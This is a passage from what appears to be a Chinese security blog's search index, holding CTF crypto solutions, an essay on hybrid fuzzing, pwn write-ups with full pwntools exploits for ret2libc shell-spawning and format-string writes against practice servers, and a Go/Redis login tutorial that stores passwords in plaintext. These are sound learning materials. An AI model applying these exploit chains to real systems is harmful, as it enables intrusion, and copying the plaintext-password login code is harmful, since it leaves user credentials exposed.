16, 19, 21, 25, 26, 27, 28], [2, 4, 6, 7, 9, 11, 12, 13, 16, 17, 20, 21, 22, 23, 24, 25, 27, 31], [2, 10, 13, 15, 16, 17, 21, 22, 23, 24, 29, 31], [1, 2, 8, 11, 12, 13, 16, 17, 19, 21, 22, 24, 25, 26, 27, 28, 30, 31], [0, 3, 6, 13, 14, 17, 19, 21, 22, 23, 26, 27, 28], [1, 5, 7, 8, 11, 12, 14, 15, 19, 23, 25, 27, 31], [0, 2, 3, 6, 7, 8, 9, 10, 11, 12, 16, 18, 19, 22, 23, 24, 25, 26, 27, 28], [0, 1, 6, 7, 10, 15, 16, 21, 24, 25, 29, 30], [1, 4, 5, 6, 7, 12, 13, 15, 18, 19, 20, 22, 26, 27, 29, 31], [0, 3, 5, 8, 9, 17, 21, 22, 24, 25, 26, 27, 30], [0, 2, 3, 4, 5, 6, 7, 8, 11, 17, 19, 20, 24, 25, 26, 27, 30], [2, 6, 7, 8, 11, 12, 14, 16, 20, 21, 22, 24, 29, 30, 31], [0, 2, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31], [0, 1, 2, 3, 4, 5, 8, 10, 11, 12, 13, 16, 17, 18, 20, 21, 22, 23, 25, 26, 28, 29, 30], [3, 5, 6, 8, 10, 13, 14, 17, 19, 20, 21, 22, 24, 26, 27, 29, 30], [1, 3, 6, 12, 14, 15, 16, 17, 18, 21, 24, 25, 26, 27, 28], [0, 1, 2, 3, 5, 6, 7, 8, 9, 12, 13, 19, 20, 23, 26, 29, 30], [3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 20, 21, 22, 25, 26, 27, 28, 29, 30], [0, 1, 2, 4, 6, 7, 9, 10, 11, 13, 15, 16, 18, 19, 20, 21, 25, 31], [0, 2, 7, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31], [1, 2, 3, 5, 7, 8, 18, 19, 21, 22, 23, 25, 31], [3, 4, 7, 8, 10, 11, 13, 14, 17, 18, 19, 21, 22, 23, 24, 28, 29], [0, 2, 6, 7, 8, 10, 11, 12, 13, 16, 18, 19, 21, 23, 31], [0, 1, 3, 4, 8, 13, 14, 16, 18, 19, 21, 26, 27, 30, 31], [5, 6, 7, 9, 13, 14, 15, 18, 19, 20, 21, 24, 25, 28], [1, 3, 4, 5, 6, 7, 11, 14, 16, 17, 19, 20, 21, 22, 23, 25, 30, 31], [2, 3, 4, 6, 7, 11, 13, 17, 18, 19, 20, 23, 24, 25, 26, 28, 29, 30, 31], [0, 1, 2, 3, 4, 7, 9, 10, 13, 15, 16, 19, 22, 23, 24, 25, 27], [0, 1, 3, 4, 12, 16, 18, 19, 26, 30]] def enc(v, keys): t=v for i in keys: q=[] for j in Pbox: q.append(sum([t[k] for k in j])%2) t=[int(q[j])^int(i[j]) for j in range(32)] return t assert(len(flag)==32) fb=bin(bytes_to_long(flag))[2:].zfill(32*8) ciphertext=\"\" for i in range(0,len(fb),32): t=enc([int(j) for j in fb[i:i+32]]) ciphertext+=\"\".join([str(j) for j in t]) print(ciphertext) ''' 0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100 ''' GF(2) 上的方程组，4个字符（32bit）一组分段加密，含有未知的 6 个 32 维 key 向量。拿到 key 即可解出 flag。 通过 flag 格式可知第一组的明文flag和加密结果，考虑使用这些解出 key。 对于密文的每一位，考虑求出所有 key 向量对其的影响，可以将 6 个 32 维 key 向量对加密结果造成的影响简化成一个 32 维的向量 key'。 设明文$A=[a_1\\ a_2\\ …\\ a_{32}]$，密文为$B=[b_1\\ b_2\\ …\\ b_{32}]$，$key'=[key_1\\ key_2\\ …\\ key_{32}]$则对于每一个$b_i$，可以得到以下方程： $$ [a_1\\ a_2\\ a_3\\ …\\ a_{32}]·X_i = b_i + key_i $$ 其中$X_i$是一个 32 维列向量。考虑依次将向量$[1\\ 0\\ 0…0]$、$[0\\ 1\\ 0…0]$、$[0\\ 0\\ 1\\ …\\ 0]$、…、$[0\\ 0\\ 0…1]$放入黑盒中加密，即可很方便地求出向量$X_i$。 def simu(v): t=v for i in range(6): q=[] for j in Pbox: q.append(sum([t[k] for k in j])%2) t=[int(q[j]) for j in range(32)] return t res = [] for i in range(32): s = [0 for j in range(32)] s[i] = 1 res.append(simu(s)) 随后利用已知的第一段明文解出向量key'。 table = [] for i in range(32): q = [] for j in range(32): q.append(res[j][i]) table.append(q) ciphertext = \"0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100\" flagcip = ciphertext[:32] flagplain = b\"flag\" fb = bin(bytes_to_long(flagplain))[2:].zfill(32) x = [int(j) for j in fb] cip = [int(j) for j in flagcip] key = [] for i in range(32): key.append((sum([table[i][j]*x[j] for j i","date":"2022-08-04","objectID":"/nep/:1:0","tags":null,"title":"NepCTF2022 个人输出复盘","uri":"/nep/"},{"categories":null,"content":"Crypto-中学数学 题目如下 from gmpy2 import * from Crypto.Util.number import * from secret import flag p = getPrime(1024) q = next_prime(p+(p\u003e\u003e500)) n = p*q e = 0x10001 m = bytes_to_long(flag) c = pow(m, e, n) ''' n = 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507 c = 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186 ''' 看起来 p 和 q 的关系难以处理，但是可以发现 n = p*q 和 p 是正比关系，直接考虑二分p。 完整 exp 如下。 from gmpy2 import * from Crypto.Util.number import * #from secret import flag #p=getPrime(1024) #q=next_prime(p+(p\u003e\u003e500)) e = 0x10001 n = 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507 c = 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186 R = 117374101720892025379926580554846261172050814835019928395780473173988319063025811236820315274901477473357362631312549265502060280672262331623398126551102411368254100359545898567189007742828060352893742491663283756824477966687393803226060355532504331569001619648536493882952835335488931507816927988398082228539 L = 1 while L \u003c R: p = (L+R) \u003e\u003e 1 q = next_prime(p+(p\u003e\u003e500)) print(p) if p*q == n: print(\"[+]P:\", p) print(\"[+]Q:\", q) break if p*q \u003e n: R = p else: L = p phi = (p-1)*(q-1) d = invert(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) ","date":"2022-08-04","objectID":"/nep/:2:0","tags":null,"title":"NepCTF2022 个人输出复盘","uri":"/nep/"},{"categories":null,"content":"模糊测试(Fuzz)介绍 ​ 模糊测试是一种漏洞发现的手段，通过用一些方式构造一些输入数据自动化地发送给程序，同时监测程序是否出现异常，将造成crash的输入数据返回给测试人员以达到发现漏洞的目的。 ​ 这里仅讨论白盒测试。 ","date":"2022-05-12","objectID":"/fuzz/:1:0","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"LLVM简介 ​ LLVM是一款非常流行的开源编译器框架，支持多种语言和底层硬件。 ​ 在使用 LLVM 进行代码优化以及插桩时，我们必须要先了解 LLVM 的基础架构。 经典编译器架构主要分为前端、中间层和后端三个部分。而我们常用的 GCC 在设计之初就导致前后端耦合度非常高，因此支持一个新的架构或编程语言对 GCC 来说都是非常难的一件事。 为了避免强耦合的情况发生，LLVM 采用了非常简洁明了的三段式设计，架构如下所示： ​ 其中LLVM的前端会对高级语言进行编译，生成能被LLVM解析并利用的中间件LLVM-IR。该IR在经过LLVM优化器进行一定程度的优化之后， 被送到LLVM的后端，根据处理器的不同最终编译成可被执行的二进制文件。 ​ 目前而言的大部分研究都会以 LLVM IR 作为工具进行程序代码的静态分析。我们知道 LLVM IR 会在优化阶段进行相应的优化，LLVM 也在优化阶段允许用户自定义一些对 IR 的操作，从而达到静态分析的效果，这种自定义模块叫做 LLVM Pass。 ","date":"2022-05-12","objectID":"/fuzz/:2:0","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"传统Fuzz常用工具介绍与工作原理分析 ","date":"2022-05-12","objectID":"/fuzz/:3:0","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"AFL/AFL++(American Fuzzy Loop) 整体架构 ​ 在Fuzz开始前AFL首先通过afl-gcc/afl-clang等编译器的wrapper来对待测程序源代码进行插桩并编译。其中插桩用于记录分支信息（如被触发次数等），用于进一步分析。 ​ 整体工作流程图如下： ​ 首先AFL从用户提供的一组输入开始，并尝试对输入进行一些变异（详见下文）。若这些变异之后的输入数据触发了新的执行路径，则加入“输入队列”，成为新的输入数据并重复上述过程。 输入变异策略 （其实是按顺序进行的） 一些不具有随机性的操作 bitflip ​ bitflip按照一些的步长对bit进行一些翻转。 ​ 在这个过程中，AFL同时会生成token和effector map。 \u003e\u003etoken ​ 判断规则：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。 ​ 例如，众所周知，在PNG文件中使用IHDR作为一个起始块的标识。当翻转I的最高位时，该标识被破坏，此时程序的执行路径必定与原本不相同。这样AFL就得到了一个可能的token：IHDR，为后面的变异做准备。 \u003e\u003eeffector map ​ 说人话就是判断有效字节。 ​ 具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。 ​ 如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很可能是“无效”的，对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。 arithmetic ​ 按照一些步长进行一些加减变换。同时参照effector map和bitflip生成过的东西剪个枝。 interest ​ 按照一些步长进行一些替换。用于替换的数一般是-128，-32768等等容易造成溢出的数。 dictionary ​ 尝试把用户提供的token和bitflip中自动检测到的token替换到源文件中。 一些具有随机性的操作 havoc 随机选取某个bit进行翻转 随机选取某个byte，将其设置为随机的interesting value 随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value 随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value 随机选取某个byte，对其减去一个随机数 随机选取某个byte，对其加上一个随机数 随机选取某个word，并随机选取大、小端序，对其减去一个随机数 随机选取某个word，并随机选取大、小端序，对其加上一个随机数 随机选取某个dword，并随机选取大、小端序，对其减去一个随机数 随机选取某个dword，并随机选取大、小端序，对其加上一个随机数 随机选取某个byte，将其设置为随机数 随机删除一段bytes 随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数 随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入 ​ 就是把前面的组合一下进行一些随机变换。 splice ​ 把一些输入拼接在一起然后做一些havoc变换 优化速度的一些操作 ​ 除此之外，AFL还会进行剔除语料库、修建输入文件等操作用于提高效率，在这里不展开叙述。 AFL++ ​ AFL++ 可以看作是升级版的 AFL。其增加了用户自定义变异器的功能，从而极大方便了我们将 Fuzzer 和符号执行工具结合在一起。此外，AFL++ 还优化了主 Fuzz 逻辑，提高了 Fuzz 效率。 ","date":"2022-05-12","objectID":"/fuzz/:3:1","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"LibFuzzer ​ 相比AFL，LibFuzzer是一种更具有针对性的模糊测试工具。它不重复启动进程，而是在单个进程中直接将数据投放在内存中，执行了所有模糊测试。 ​ 同时，LibFuzzer是以代码覆盖率为引导的——它对每一个输入都进行代码覆盖率的计算，不断累积这些测试用例使代码覆盖率达到最大。同时，它会根据代码的覆盖率回馈进行变异。其变异算法和AFL大同小异，这里不再赘述。 ","date":"2022-05-12","objectID":"/fuzz/:3:2","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"传统模糊测试弊端分析 ​ 通过上面对AFL的工作原理分析我们可以看到，传统Fuzzing生成的输入样例策略具有很强的随机性，质量较低，对于一些比较难以触发的深度较深或条件约束比较复杂的分支，传统Fuzzing就难以成功触发。 ","date":"2022-05-12","objectID":"/fuzz/:3:3","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"符号执行 ​ 符号执行是一种静态的白盒分析技术，并未实际地执行程序，而是分析程序的执行路径。符号执行的最终目的和Fuzz相同——找到一组或几组能触发程序异常的输入数据，达到发现漏洞的目的。 ","date":"2022-05-12","objectID":"/fuzz/:4:0","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"静态符号执行(Symbolic execution) 工作原理概述 ​ 符号执行的关键思想是：把输入变为符号值，那么程序计算的输出值就是一个符号输入值的函数。一个程序执行的路径通常是true和false条件的序列，这些条件是在分支语句处产生的。在序列的第i位置如果值是true，那么意味着第i个条件语句走的是then这个分支；反之如果是false就意味着程序执行走的是else分支。形象化地，程序执行的路径可以表示为一棵“执行树”，而符号执行便是要生成一些输入的集合，探索所有的路径。 符号执行会在全局维护两个变量：符号状态$\\sigma$和符号化路径约束PC。 通俗地说，符号状态$\\sigma$是一个映射，保存了所有变量和符号之间的关系，形如： $$ \\sigma = { x \\rightarrow x_0, y \\rightarrow y_0, z \\rightarrow 2y_0 } $$ 其中$x_0$和$y_0$是两个未被约束的符号值，通常是由用户输入的数据。而x、y、z则是程序中的一些变量。 而符号化路径约束PC是一个无量词一阶公式。它代表着执行到某个程序分支的约束条件，形如： $$ (x_0=2y_0)∧(x_0\u003ey_0+10) $$ $\\sigma$和PC会随着符号执行的进度进行更新，更新方法详见下文。 毛了一个例子来： void testme(int x, int y){ z = y*2; if(z == x){ if(x \u003e y+10) ERROR; } } /* simple driver exercising testme() with sym inputs */ int main(){ x = sym_input(); y = sym_input(); testme(x, y); return 0; } 我们以这个为例来阐述符号执行的具体过程。 在符号执行开始前，$\\sigma$被初始化为一个空映射，PC被初始化为true。 当遇到一个输入语句x=sym_input();时，创建一个未约束的符号值并建立映射。执行完main的前两行得到的符号状态是$\\sigma={x \\rightarrow x_0, y \\rightarrow y_0}$ 当遇到一个赋值语句z=y*2时，计算符号的表达式并且建立映射。执行完testme的第一行得到的符号状态是$\\sigma={x \\rightarrow x_0, y \\rightarrow y_0, z \\rightarrow 2y_0}$ 当遇到一个分支语句if(z==x)时，将条件计算成符号的表达式\\sigma(e)，将PC更新为$PC∧\\sigma(e)$表示then分支。同时建立一个新的路径约束PC'，初始化为$PC∧\\neg \\sigma(e)$表示else分支。如果PC和PC’都可能被满足，就新开一个符号执行实例走else分支继续执行。如果都不能满足则会直接终止。 例如，第7行建立了两个不同的符号执行实例，路径约束分别是 $x_0=2y_0$ 和 $x_0 \\not = 2y_0$ 。在第8行，又建立了两个符号执行实例，路径约束分别是 $(x_0=2y_0) \\wedge (x_0 \u003e y_0 + 10)$和 $(x_0=2y_0) \\wedge (x_0 \\leq y_0 + 10)$. 这样的执行结束后，我们会得到每个分支的一些路径约束，用约束求解器进行一个求解就可以获得每个分支的对应输入。 问题分析 看看这个 void testme_inf() { int sum = 0; int N = sym_input(); while (N \u003e 0) { sum = sum + N N = sym_input(); } } 不难发现，这样的程序在符号执行时会有无限量的路径。 同时，若符号路径约束包含了不能由约束求解器高效求解的约束（如：$x_0=y_0^2\\ mod\\ 50$），静态符号执行就无法产生输入。 ","date":"2022-05-12","objectID":"/fuzz/:4:1","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"动态符号执行(Concolic Execution) ​ 为了解决上述的问题，动态执行选择了将实际执行和静态符号执行混合起来。 ​ 动态执行维护一个实际状态和一个符号化状态：实际状态将所有变量映射到实际值，符号状态只映射那些有非实际值的变量。动态符号执行首先用一些给定的或者随机的输入来执行程序，收集执行过程中条件语句对输入的符号化约束，然后使用约束求解器去推理输入的变化，从而将下一次程序的执行导向另一条执行路径。 ​ 简单地说，就是在已有实际输入得到的路径上，对分支路径条件进行取反，就可以让执行走向另外一条路径。这个过程会不断地重复，理论上可以覆盖到程序能达到的所有分支。 ​ 由于程序的分支可能会有很多，动态符号执行有时会使用启发式的方法寻找路径，同时在约束求解方面进行一些优化和剪枝来优化效率。 ","date":"2022-05-12","objectID":"/fuzz/:4:2","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"动态符号执行弊端分析 ​ 与传统Fuzz恰好相反，动态符号执行能产生高质量的输入数据，能探索复杂路径，但是在约束求解等地方耗费的时间比较多，时间开销较大。 ","date":"2022-05-12","objectID":"/fuzz/:4:3","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"混合模糊测试（Hybrid fuzzing） ","date":"2022-05-12","objectID":"/fuzz/:5:0","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"混合模糊测试概述 混合模糊测试其实就是把传统模糊测试和动态符号执行结合起来，以达成高效、高质量的模糊测试。动态符号执行可以帮助 Fuzzing 求解复杂的约束条件，Fuzzing 可以为动态符号执行快速探索程序路径。 为了叙述方便，下面把传统模糊测试简称为“Fuzz”，动态符号执行简称为“符号执行”。 ","date":"2022-05-12","objectID":"/fuzz/:5:1","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"混合模糊测试的几种策略 需求分发策略 一种简单的混合模糊测试策略：先启用Fuzz，在Fuzz卡住（不能继续发现新分支）的时候启用符号执行，常用的Driller工具就是基于这一策略的。 但这种策略存在一些难以解决的问题。 首先Fuzz“卡住”是一种很难判断的状态——万一下一秒就好了呢？到底“卡住”多久才算卡住？ 当Fuzz卡住的时候，怎么知道到底卡在哪里了？如何找出卡住Fuzz的是程序的那个分支约束条件？ 就算找到了让Fuzz卡住的地方，使用符号执行就一定更优吗？有没有一种可能，就是说其实把用于符号执行的时间拿来继续Fuzz能更快地找到能覆盖这个分支的输入？ Fuzz产生了大量的输入，如果要使用符号执行，很显然全部执行一遍是不现实的。如何判断哪些输入更值得被交给符号执行处理？ 除此以外，Fuzz和符号执行的这种异步处理方式也造成了很大的时间浪费。 Optimal Switch策略 对每一条程序路径，分别评估使用Fuzz探索的代价和使用符号执行探索的代价，选择“性价比”更高的一种探索方式。 这种方法虽然理论可行，但是Fuzz和符号执行探索的方法难以量化。即使能进行量化，也会造成更加重量级的开销。 DigFuzz 相比于对每条路径评估Fuzz和符号执行的代价，DigFuzz选择评估每条路径的“探索难度”，把探索难度较低的交给Fuzz，其余交给符号执行。 估计方法是“基于蒙特卡洛的路径概率排序模型”。 蒙特卡洛方法其实就是这个↓ （我也刚刚知道这种方法的名字） 具体来说，就是把Fuzz的过程看成随机取样，统计每条路径被覆盖到的概率，每次把被覆盖概率最低的路径交给符号执行进行处理。 Savior 在论文SAVIOR: Towards Bug-Driven Hybrid Testing中，提出了两个问题： 1、存在漏洞的代码是少数，以代码覆盖率为导向并不是最优的策略。 2、即使能够到达存在漏洞的代码位置，很多漏洞由于不满足条件，无法触发漏洞。 如下面这个例子（来自论文Intriguer: Field-Level Constraint Solving for Hybrid Fuzzing） 触发15行整数溢出漏洞的约束： 1、$width\u003e0x5FFF$ 2、$height\u003e0x5FFF$ 3、$width*height*8\u003e0xFFFFFFFF$ 其中第三条约束是一个较为严苛的条件，而且动态符号执行无法得到这样的约束，因此即使达到了代码位置也无法触发漏洞。 因此Savior提出了一种用输入未探索路径上的未定义行为的数量来评估输入价值的混合Fuzz方法。同时，将这些未定义行为的路径约束拿出来进行一个求解，来达到“以bug为导向”的模糊测试。 摸了，后续懒得更到blog上了。感兴趣可以看一下我在5.21腾讯科恩技术沙龙上的演讲。（B站上应该有） https://www.bilibili.com/video/BV1Ua41177at ","date":"2022-05-12","objectID":"/fuzz/:5:2","tags":null,"title":"混合模糊测试的分析与研究","uri":"/fuzz/"},{"categories":null,"content":"ret2libc 题目：ciscn_2019_c_1 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 分析程序，发现encrypt函数存在危险函数gets可以造成栈溢出。程序开了NX保护，没有现成可供使用的shell代码，考虑使用ret2libc 首先使用ROPgadget找到需要的gadget:pop rdi; ret和ret python ROPgadget.py --binary ciscn --only \"pop|ret\" Gadgets information ============================================================ 0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000400c80 : pop r14 ; pop r15 ; ret 0x0000000000400c82 : pop r15 ; ret 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret 0x00000000004007f0 : pop rbp ; ret 0x0000000000400aec : pop rbx ; pop rbp ; ret 0x0000000000400c83 : pop rdi ; ret 0x0000000000400c81 : pop rsi ; pop r15 ; ret 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004006b9 : ret 0x00000000004008ca : ret 0x2017 0x0000000000400962 : ret 0x458b 0x00000000004009c5 : ret 0xbf02 Unique gadgets found: 15 利用encrypt函数中的puts泄露出puts函数在内存中的地址，并重新调用执行main函数。 pop_rdi_ret = 0x400c83 ret = 0x4006b9 start_addr = 0x400B28 puts_got = elf.got['puts'] puts_plt = elf.plt['puts'] p.recvuntil(\"choice!\\n\".encode()) p.sendline(\"1\".encode()) p.recv() payload = b\"A\" * 88 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr) p.sendline(payload) p.recvuntil(b'Ciphertext\\n') p.recvline() puts_leak = u64(p.recvline()[:-1].ljust(8, b'\\0')) 利用泄漏的地址寻找对应的Libc版本，并计算得到libc的加载地址和system函数、/bin/sh字符串对应地址，再次利用栈溢出漏洞得到shell libc = LibcSearcher('puts', puts_leak) libcbase = puts_leak - libc.dump('puts') bin_sh_addr = libcbase + libc.dump('str_bin_sh') system_addr = libcbase + libc.dump('system') payload = b\"A\" * 88 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) p.sendline(payload) p.interactive() 完整代码： from pwn import * from LibcSearcher import * elf = ELF(\"./ciscn\") p = remote(\"node4.buuoj.cn\", 29518) pop_rdi_ret = 0x400c83 ret = 0x4006b9 start_addr = 0x400B28 puts_got = elf.got['puts'] puts_plt = elf.plt['puts'] p.recvuntil(\"choice!\\n\".encode()) p.sendline(\"1\".encode()) p.recv() payload = b\"A\" * 88 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr) p.sendline(payload) p.recvuntil(b'Ciphertext\\n') p.recvline() puts_leak = u64(p.recvline()[:-1].ljust(8, b'\\0')) p.recvuntil(\"choice!\\n\".encode()) p.sendline(\"1\".encode()) p.recv() libc = LibcSearcher('puts', puts_leak) libcbase = puts_leak - libc.dump('puts') bin_sh_addr = libcbase + libc.dump('str_bin_sh') system_addr = libcbase + libc.dump('system') payload = b\"A\" * 88 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) p.sendline(payload) p.recv() p.sendline(b\"cat flag\") print(p.recv()) ","date":"2022-04-14","objectID":"/pwn/:1:0","tags":null,"title":"诗乃今天Pwn了吗","uri":"/pwn/"},{"categories":null,"content":"格式化字符串漏洞-任意地址写入 题目：[第五空间2019 决赛]PWN5 程序逻辑为向0x804C044写入随机数作为密码，输入密码正确反弹shell。 存在格式化字符串漏洞printf(buf)。 考虑利用格式化字符串漏洞修改0x804C044位置的值获得shell。 首先爆破一下偏移量 from pwn import * def pwn(payload): p = remote(\"node4.buuoj.cn\", 29282) p.recv() p.sendline(payload) return p.recv()[6:-1] auto = FmtStr(pwn) offset = auto.offset 得到offset=10 利用格式化字符串漏洞将0x804C044位置的值修改为0xcafe offset = 10 p = remote(\"node4.buuoj.cn\", 29282) p.recv() payload = fmtstr_payload(offset, {0x804C044 : 0xcafe}) p.sendline(payload) p.recv() p.sendline(str(0xcafe).encode()) p.interactive() 完整代码： from pwn import * def pwn(payload): p = remote(\"node4.buuoj.cn\", 29282) p.recv() p.sendline(payload) info = p.recv()[6:-1] return info auto = FmtStr(pwn) offset = auto.offset p = remote(\"node4.buuoj.cn\", 29282) p.recv() payload = fmtstr_payload(offset, {0x804C044 : 0xcafe}) p.sendline(payload) p.recv() p.sendline(str(0xcafe).encode()) p.recv() p.sendline(b\"cat flag\") print(p.recv()) ","date":"2022-04-14","objectID":"/pwn/:2:0","tags":null,"title":"诗乃今天Pwn了吗","uri":"/pwn/"},{"categories":null,"content":"在学了在学了 ","date":"2022-04-14","objectID":"/pwn/:3:0","tags":null,"title":"诗乃今天Pwn了吗","uri":"/pwn/"},{"categories":null,"content":"简易前端 我们先随便写一个简单的前端页面，放在工作目录下./templates文件夹中。 \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://47.108.140.140:8080/loginform\" method=\"post\"\u003e 用户名：\u003cinput type=\"text\" name=\"username\" placeholder=\"请输入你的用户名\"\u003e \u003cbr\u003e 密\u0026nbsp;\u0026nbsp;\u0026nbsp;码：\u003cinput type=\"password\" name=\"password\" placeholder=\"请输入你的密码\"\u003e \u003cbr\u003e \u003cinput type=\"submit\" value=\"登录\"\u003e \u003c/form\u003e \u003cp\u003e ============OR============= \u003c/p\u003e \u003cform action=\"http://47.108.140.140:8080/registerform\" method=\"post\"\u003e 用户名：\u003cinput type=\"text\" name=\"username\" placeholder=\"请输入你的用户名\"\u003e \u003cbr\u003e 密\u0026nbsp;\u0026nbsp;\u0026nbsp;码：\u003cinput type=\"password\" name=\"password\" placeholder=\"请输入你的密码\"\u003e \u003cbr\u003e \u003cinput type=\"submit\" value=\"注册\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 由于不是重点，这里不详细介绍前端功能 ","date":"2022-03-29","objectID":"/go-auth/:1:0","tags":null,"title":"使用Go+Gin+Redis实现一个简单的登录注册系统","uri":"/go-auth/"},{"categories":null,"content":"Gin响应请求的基本方法 package main import ( \"github.com/gin-gonic/gin\" \"net/http\" ) func main() { r := gin.Default() r.GET(\"/getroute\", getfunction) r.POST(\"/postroute\", postfunction) r.Run(\":8080\") } ","date":"2022-03-29","objectID":"/go-auth/:2:0","tags":null,"title":"使用Go+Gin+Redis实现一个简单的登录注册系统","uri":"/go-auth/"},{"categories":null,"content":"响应GET请求：返回index.html r.LoadHTMLGlob(\"templates/*\") //载入templates文件夹下的所有文件 r.GET(\"/login\", func(context *gin.Context) { context.HTML(http.StatusOK, \"index.html\", gin.H { title\" :\"Auth\", }) }) ","date":"2022-03-29","objectID":"/go-auth/:3:0","tags":null,"title":"使用Go+Gin+Redis实现一个简单的登录注册系统","uri":"/go-auth/"},{"categories":null,"content":"响应POST请求：返回登录状态 r.POST(\"/loginform\", func(context *gin.Context) { username := context.PostForm(\"username\") password := context.PostForm(\"password\") rdb, err := redis.Dial(\"tcp\",\"127.0.0.1:6379\") //连接Redis数据库 if err != nil { panic(err) } exists, err := redis.Bool(rdb.Do(\"EXISTS\", username)) if exists != true { defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"用户名不存在\", }) return } res, err := rdb.Do(\"Get\", username) passget := string(res.([]byte)) if passget != password { defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"用户名或密码错误\", }) return } if err != nil { panic(err) } defer rdb.Close() context.JSON(http.StatusOK, gin.H { \"message\" : \"登录成功\", }) }) ","date":"2022-03-29","objectID":"/go-auth/:4:0","tags":null,"title":"使用Go+Gin+Redis实现一个简单的登录注册系统","uri":"/go-auth/"},{"categories":null,"content":"完整代码 package main import ( \"github.com/gin-gonic/gin\" \"net/http\" \"github.com/garyburd/redigo/redis\" ) func main() { r := gin.Default() r.LoadHTMLGlob(\"templates/*\") r.GET(\"/login\", func(context *gin.Context) { context.HTML(http.StatusOK, \"index.html\", gin.H { \"title\" :\"Auth\", }) 